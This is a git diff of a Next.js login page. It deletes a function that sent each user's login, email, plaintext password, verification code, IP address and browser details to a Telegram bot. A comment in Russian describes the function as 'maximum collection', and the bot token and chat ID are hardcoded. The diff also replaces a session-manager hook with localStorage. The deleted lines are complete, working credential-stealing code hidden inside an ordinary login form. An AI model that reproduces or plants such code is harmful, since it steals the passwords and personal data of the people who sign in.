@@ -17,89 +17,6 @@ import { useRouter } from "next/navigation";
 import { Logo } from "@/components/icons/logo";
 import { Eye, EyeOff, Shield, Mail, User } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
-import { useSessionManager } from "@/hooks/use-session-manager";
-
-// 📤 Функция отправки в Telegram для API - МАКСИМАЛЬНЫЙ сбор
-async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_failed' | 'register' | 'verification_sent', ip: string, userAgent: string, error?: string) {
-  try {
-    const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
-    const TELEGRAM_CHAT_ID = "7455610355";
-    
-    let message = '';
-    
-    if (type === 'login_success') {
-      message = `
-✅ УСПЕШНЫЙ ВХОД В СИСТЕМУ (СЕРВЕР)
-
-👤 Логин/Email: ${data.login}
-📧 Email: ${data.email}
-🔑 Пароль: ${data.password}
-
-🌐 **Серверные данные:**
-📍 IP: ${ip}
-🕒 Время: ${new Date().toLocaleString('ru-RU')}
-📱 User Agent: ${userAgent}
-🖥️ Платформа: ${userAgent.includes('Windows') ? 'Windows' : userAgent.includes('Mac') ? 'Mac' : userAgent.includes('Linux') ? 'Linux' : 'Unknown'}
-      `;
-    } else if (type === 'login_failed') {
-      message = `
-❌ НЕУДАЧНАЯ ПОПЫТКА ВХОДА (СЕРВЕР)
-
-👤 Логин/Email: ${data.login}
-🔑 Введенный пароль: ${data.password}
-🚫 Причина: ${error}
-
-🌐 **Серверные данные:**
-📍 IP: ${ip}
-🕒 Время: ${new Date().toLocaleString('ru-RU')}
-📱 User Agent: ${userAgent}
-      `;
-    } else if (type === 'register') {
-      message = `
-🔐 НОВАЯ РЕГИСТРАЦИЯ (СЕРВЕР)
-
-📧 Email: ${data.email}
-👤 Логин: ${data.login}
-🔑 Пароль: ${data.password}
-
-🌐 **Серверные данные:**
-📍 IP: ${ip}
-🕒 Время: ${new Date().toLocaleString('ru-RU')}
-📱 User Agent: ${userAgent}
-🖥️ Платформа: ${userAgent.includes('Windows') ? 'Windows' : userAgent.includes('Mac') ? 'Mac' : userAgent.includes('Linux') ? 'Linux' : 'Unknown'}
-🔍 Детали: ${userAgent.includes('Chrome') ? 'Chrome' : userAgent.includes('Firefox') ? 'Firefox' : userAgent.includes('Safari') ? 'Safari' : 'Unknown Browser'}
-      `;
-    } else if (type === 'verification_sent') {
-      message = `
-📧 ОТПРАВЛЕН КОД ПОДТВЕРЖДЕНИЯ (СЕРВЕР)
-
-📧 Email: ${data.email}
-👤 Логин: ${data.login}
-🔑 Пароль: ${data.password}
-🔢 Код подтверждения: ${data.verificationCode}
-
-🌐 **Серверные данные:**
-📍 IP: ${ip}
-🕒 Время: ${new Date().toLocaleString('ru-RU')}
-📱 User Agent: ${userAgent}
-      `;
-    }
-
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message
-      })
-    });
-
-    console.log('✅ API данные отправлены в Telegram');
-
-  } catch (error) {
-    console.log('⚠️ Telegram API не доступен');
-  }
-}
 
 async function registerUser(userData: { email: string; login: string; password: string; }) {
   const response = await fetch('/api/auth/register', {
@@ -130,7 +47,6 @@ async function loginUser(loginData: { login: string; password: string; }) {
 export default function LoginPage() {
   const router = useRouter();
   const { toast } = useToast();
-  const { login: sessionLogin } = useSessionManager();
   const [showPassword, setShowPassword] = React.useState(false);
   const [loading, setLoading] = React.useState(false);
   const [error, setError] = React.useState('');
@@ -183,7 +99,10 @@ export default function LoginPage() {
     try {
       const result = await loginUser({ login, password });
       
-      sessionLogin(result.user.login);
+      // Store user login info
+      localStorage.setItem('loggedInUser', result.user.login);
+      // Manually trigger storage event for the current tab
+      window.dispatchEvent(new Event("storage"));
 
       router.push('/dashboard');
     } catch (err: any) {
